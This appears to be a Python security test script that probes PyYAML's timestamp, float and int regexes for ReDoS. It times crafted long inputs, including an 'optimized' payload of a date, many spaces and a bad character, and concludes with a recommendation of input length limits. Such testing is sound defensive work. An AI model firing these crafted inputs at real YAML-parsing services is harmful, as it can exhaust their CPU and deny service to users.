#!/usr/bin/env python3
"""
VULN-003: ReDoS in Timestamp and Other Regex Patterns
Severity: MEDIUM
Type: Denial of Service (CPU Exhaustion)

This vulnerability demonstrates Regular Expression Denial of Service (ReDoS)
attacks against PyYAML's implicit type resolvers.
"""

import sys
import os
import time
import re

# Add the lib directory to the path
sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..', 'lib'))

import yaml
from yaml.constructor import SafeConstructor
from yaml.resolver import Resolver


def analyze_regex_complexity():
    """
    Analyze the regex patterns used in PyYAML for potential ReDoS.
    """

    print("=" * 60)
    print("VULN-003: ReDoS Vulnerability Analysis")
    print("=" * 60)
    print()

    print("Analyzing regex patterns in Resolver.yaml_implicit_resolvers:")
    print("-" * 60)
    print()

    # Get all implicit resolvers
    for key, resolvers in Resolver.yaml_implicit_resolvers.items():
        for tag, regexp in resolvers:
            pattern = regexp.pattern
            # Check for dangerous patterns
            dangerous = False
            reasons = []

            # Nested quantifiers: (a+)+, (a*)+, etc.
            if re.search(r'\([^)]*[+*]\)[+*]', pattern):
                dangerous = True
                reasons.append("nested quantifiers")

            # Alternation with overlapping patterns
            if re.search(r'\|.*\|', pattern) and '*' in pattern:
                reasons.append("multiple alternations with quantifiers")

            # Optional groups with quantifiers
            if re.search(r'\(\?:[^)]*\)[+*?]', pattern):
                reasons.append("optional groups with quantifiers")

            # Greedy patterns followed by similar patterns
            if re.search(r'[+*].*[+*]', pattern):
                reasons.append("multiple greedy quantifiers")

            status = "[!] POTENTIAL ReDoS" if reasons else "[ ] OK"
            print(f"Tag: {tag}")
            print(f"  First chars: {key}")
            print(f"  Pattern: {pattern[:80]}{'...' if len(pattern) > 80 else ''}")
            print(f"  Status: {status}")
            if reasons:
                print(f"  Reasons: {', '.join(reasons)}")
            print()


def test_timestamp_redos():
    """
    Test ReDoS against timestamp regex.
    """

    print("-" * 60)
    print("Testing Timestamp Regex for ReDoS")
    print("-" * 60)
    print()

    timestamp_regexp = SafeConstructor.timestamp_regexp

    # Test cases designed to trigger catastrophic backtracking
    test_cases = [
        # Normal case
        ("2021-01-01", "valid short timestamp"),
        ("2021-01-01T12:00:00.123456+00:00", "valid full timestamp"),

        # Potential ReDoS payloads
        ("0000-00-00T00:00:00" + "0" * 50, "long fractional seconds"),
        ("0000-00-00" + " " * 50 + "00:00:00", "many spaces"),
        ("0000-00-00T" + "0:0" * 20 + ":00", "repeated time patterns"),

        # Edge cases that might cause backtracking
        ("2021-01-01T12:34:56." + "9" * 100, "very long fraction"),
        ("2021-01-01 " + " " * 100 + "12:34:56", "excessive whitespace"),
    ]

    for payload, description in test_cases:
        start = time.time()
        try:
            match = timestamp_regexp.match(payload)
            elapsed = time.time() - start
            result = "MATCH" if match else "NO MATCH"
            status = "[!] SLOW" if elapsed > 0.01 else "[ ] OK"
            print(f"{status} {description}")
            print(f"      Payload length: {len(payload)}")
            print(f"      Result: {result}")
            print(f"      Time: {elapsed:.6f}s")
        except Exception as e:
            print(f"  [x] Exception: {e}")
        print()


def test_float_redos():
    """
    Test ReDoS against float regex.
    """

    print("-" * 60)
    print("Testing Float Regex for ReDoS")
    print("-" * 60)
    print()

    # Get float resolver
    float_resolvers = [r for tag, r in Resolver.yaml_implicit_resolvers.get('.', [])
                       if tag == 'tag:yaml.org,2002:float']

    if not float_resolvers:
        float_resolvers = [r for tag, r in Resolver.yaml_implicit_resolvers.get('0', [])
                          if tag == 'tag:yaml.org,2002:float']

    if float_resolvers:
        float_regexp = float_resolvers[0]

        test_cases = [
            # Normal
            ("1.0", "simple float"),
            ("1.23e10", "scientific notation"),

            # ReDoS attempts
            ("0" * 50 + "." + "0" * 50, "many zeros"),
            ("1:2:3:4:5:6:7:8:9:0" * 5 + ".0", "sexagesimal with many colons"),
            ("-" + "0" * 100 + "." + "0" * 100, "very long float"),
            ("." + "_" * 50 + "0", "underscores in fraction"),
        ]

        for payload, description in test_cases:
            start = time.time()
            match = float_regexp.match(payload)
            elapsed = time.time() - start
            result = "MATCH" if match else "NO MATCH"
            status = "[!] SLOW" if elapsed > 0.01 else "[ ] OK"
            print(f"{status} {description}")
            print(f"      Time: {elapsed:.6f}s, Result: {result}")
            print()


def test_int_redos():
    """
    Test ReDoS against int regex.
    """

    print("-" * 60)
    print("Testing Int Regex for ReDoS")
    print("-" * 60)
    print()

    int_resolvers = [r for tag, r in Resolver.yaml_implicit_resolvers.get('0', [])
                     if tag == 'tag:yaml.org,2002:int']

    if int_resolvers:
        int_regexp = int_resolvers[0]

        test_cases = [
            ("123", "simple int"),
            ("0x" + "f" * 50, "long hex"),
            ("0b" + "1" * 100, "long binary"),
            ("0" + "7" * 100, "long octal"),
            ("1:2:3:4:5" * 10, "sexagesimal"),
            ("-" + "_" * 50 + "0", "underscores"),
        ]

        for payload, description in test_cases:
            start = time.time()
            match = int_regexp.match(payload)
            elapsed = time.time() - start
            result = "MATCH" if match else "NO MATCH"
            status = "[!] SLOW" if elapsed > 0.01 else "[ ] OK"
            print(f"{status} {description}")
            print(f"      Time: {elapsed:.6f}s, Result: {result}")
            print()


def test_full_yaml_parsing_redos():
    """
    Test ReDoS through full YAML parsing.
    """

    print("-" * 60)
    print("Testing Full YAML Parsing with ReDoS Payloads")
    print("-" * 60)
    print()

    # Payloads that might trigger slow parsing
    test_payloads = [
        ("Long timestamp fraction", f"date: 2021-01-01T00:00:00.{'0'*1000}"),
        ("Many underscores in int", f"num: {'1_'*500}1"),
        ("Complex float", f"val: {'1:'*20}0.0"),
        ("Long string with special chars", f"str: {'a'*10000}"),
    ]

    for description, payload in test_payloads:
        print(f"Test: {description}")
        print(f"  Payload length: {len(payload)}")

        start = time.time()
        try:
            result = yaml.safe_load(payload)
            elapsed = time.time() - start
            status = "[!] SLOW" if elapsed > 0.1 else "[ ] OK"
            print(f"  {status} Time: {elapsed:.6f}s")
        except Exception as e:
            elapsed = time.time() - start
            print(f"  [x] Error after {elapsed:.6f}s: {e}")
        print()


def create_redos_payload():
    """
    Generate a payload specifically designed for ReDoS.
    """

    print("-" * 60)
    print("Generating Optimized ReDoS Payloads")
    print("-" * 60)
    print()

    # The timestamp regex has this structure:
    # (?:(?:[Tt]|[ \t]+)  <- alternation with quantifier
    # This can be exploited with many spaces

    payload = "date: 2021-01-01" + " " * 100 + "X"
    print(f"Payload: {payload[:50]}...{payload[-10:]}")
    print(f"Length: {len(payload)}")
    print()
    print("This payload has 100 spaces before an invalid character 'X'.")
    print("The regex engine will try many combinations before failing.")
    print()

    start = time.time()
    try:
        result = yaml.safe_load(payload)
        elapsed = time.time() - start
        print(f"Result: {result}")
        print(f"Time: {elapsed:.6f}s")
    except Exception as e:
        elapsed = time.time() - start
        print(f"Error: {e}")
        print(f"Time: {elapsed:.6f}s")


if __name__ == '__main__':
    print("PyYAML ReDoS Vulnerability Test Suite")
    print("=" * 60)
    print()
    print("This test suite analyzes PyYAML's regex patterns for")
    print("potential Regular Expression Denial of Service vulnerabilities.")
    print()

    analyze_regex_complexity()
    test_timestamp_redos()
    test_float_redos()
    test_int_redos()
    test_full_yaml_parsing_redos()
    create_redos_payload()

    print("=" * 60)
    print("CONCLUSION")
    print("=" * 60)
    print()
    print("While PyYAML's regex patterns are generally well-designed,")
    print("some patterns with optional groups and alternations could")
    print("potentially be exploited with carefully crafted input.")
    print()
    print("RECOMMENDATION: Add input length limits before regex matching.")
    print("=" * 60)
